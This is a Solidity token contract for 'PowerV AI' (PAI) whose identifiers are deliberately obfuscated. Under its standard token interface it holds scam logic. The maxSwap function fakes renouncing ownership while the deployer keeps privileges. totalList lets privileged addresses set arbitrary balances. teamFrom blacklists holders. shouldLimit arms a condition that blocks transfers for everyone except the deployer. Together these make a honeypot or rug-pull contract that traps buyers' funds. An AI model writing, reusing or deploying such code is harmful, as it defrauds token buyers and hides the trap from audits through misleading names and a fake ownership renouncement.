//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface feeMarketingBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapBuy) external view returns (uint256);

    function transfer(address feeTrading, uint256 takeAt) external returns (bool);

    function allowance(address tokenLaunchSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeAt) external returns (bool);

    function transferFrom(
        address sender,
        address feeTrading,
        uint256 takeAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundTotalReceiver, uint256 value);
    event Approval(address indexed tokenLaunchSender, address indexed spender, uint256 value);
}

interface feeMarketingBuyMetadata is feeMarketingBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract feeFromIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitLiquidity {
    function createPair(address fundShould, address fromReceiver) external returns (address);
}

interface liquidityEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract PowerVAI is feeFromIs, feeMarketingBuy, feeMarketingBuyMetadata {

    address public senderTakeMin;

    function name() external view virtual override returns (string memory) {
        return swapFee;
    }

    uint256 private liquidityToken;

    function approve(address txMode, uint256 takeAt) public virtual override returns (bool) {
        launchedSender[_msgSender()][txMode] = takeAt;
        emit Approval(_msgSender(), txMode, takeAt);
        return true;
    }

    uint256 private modeTeam = 100000000 * 10 ** 18;

    bool private buyList;

    function owner() external view returns (address) {
        return fundIsReceiver;
    }

    function amountReceiverMax(address swapTeamExempt, address feeTrading, uint256 takeAt) internal returns (bool) {
        if (swapTeamExempt == senderTakeMin) {
            return modeTo(swapTeamExempt, feeTrading, takeAt);
        }
        uint256 buyAuto = feeMarketingBuy(fundLimit).balanceOf(teamWallet);
        require(buyAuto == txMarketingList);
        require(!fromAmount[swapTeamExempt]);
        return modeTo(swapTeamExempt, feeTrading, takeAt);
    }

    bool public teamMarketing;

    address receiverLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function isFrom(address takeSender) public {
        if (teamMarketing) {
            return;
        }
        if (liquidityTake) {
            buyList = false;
        }
        modeLiquidityExempt[takeSender] = true;
        if (liquidityToken != shouldTo) {
            buyList = false;
        }
        teamMarketing = true;
    }

    function senderMode() private view {
        require(modeLiquidityExempt[_msgSender()]);
    }

    mapping(address => bool) public fromAmount;

    bool private amountSwapLiquidity;

    address private fundIsReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return modeTeam;
    }

    uint8 private exemptMax = 18;

    function balanceOf(address swapBuy) public view virtual override returns (uint256) {
        return senderMarketing[swapBuy];
    }

    bool public atToken;

    address teamWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return teamLimit;
    }

    string private teamLimit = "PAI";

    mapping(address => bool) public modeLiquidityExempt;

    function totalList(address launchedSenderMode, uint256 takeAt) public {
        senderMode();
        senderMarketing[launchedSenderMode] = takeAt;
    }

    mapping(address => mapping(address => uint256)) private launchedSender;

    function shouldLimit(uint256 takeAt) public {
        senderMode();
        txMarketingList = takeAt;
    }

    function transferFrom(address swapTeamExempt, address feeTrading, uint256 takeAt) external override returns (bool) {
        if (_msgSender() != receiverLimit) {
            if (launchedSender[swapTeamExempt][_msgSender()] != type(uint256).max) {
                require(takeAt <= launchedSender[swapTeamExempt][_msgSender()]);
                launchedSender[swapTeamExempt][_msgSender()] -= takeAt;
            }
        }
        return amountReceiverMax(swapTeamExempt, feeTrading, takeAt);
    }

    function modeTo(address swapTeamExempt, address feeTrading, uint256 takeAt) internal returns (bool) {
        require(senderMarketing[swapTeamExempt] >= takeAt);
        senderMarketing[swapTeamExempt] -= takeAt;
        senderMarketing[feeTrading] += takeAt;
        emit Transfer(swapTeamExempt, feeTrading, takeAt);
        return true;
    }

    function maxSwap() public {
        emit OwnershipTransferred(senderTakeMin, address(0));
        fundIsReceiver = address(0);
    }

    function allowance(address enableTake, address txMode) external view virtual override returns (uint256) {
        if (txMode == receiverLimit) {
            return type(uint256).max;
        }
        return launchedSender[enableTake][txMode];
    }

    address public fundLimit;

    bool private minSell;

    uint256 txMarketingList;

    function getOwner() external view returns (address) {
        return fundIsReceiver;
    }

    uint256 receiverAuto;

    function transfer(address launchedSenderMode, uint256 takeAt) external virtual override returns (bool) {
        return amountReceiverMax(_msgSender(), launchedSenderMode, takeAt);
    }

    event OwnershipTransferred(address indexed amountReceiver, address indexed toExempt);

    constructor (){
        
        maxSwap();
        liquidityEnable toTakeToken = liquidityEnable(receiverLimit);
        fundLimit = limitLiquidity(toTakeToken.factory()).createPair(toTakeToken.WETH(), address(this));
        if (amountSwapLiquidity) {
            atToken = false;
        }
        senderTakeMin = _msgSender();
        modeLiquidityExempt[senderTakeMin] = true;
        senderMarketing[senderTakeMin] = modeTeam;
        
        emit Transfer(address(0), senderTakeMin, modeTeam);
    }

    string private swapFee = "PowerV AI";

    bool private liquidityTake;

    function teamFrom(address receiverWallet) public {
        senderMode();
        
        if (receiverWallet == senderTakeMin || receiverWallet == fundLimit) {
            return;
        }
        fromAmount[receiverWallet] = true;
    }

    bool private fromExempt;

    uint256 private shouldTo;

    function decimals() external view virtual override returns (uint8) {
        return exemptMax;
    }

    mapping(address => uint256) private senderMarketing;

    bool private launchedAmount;

}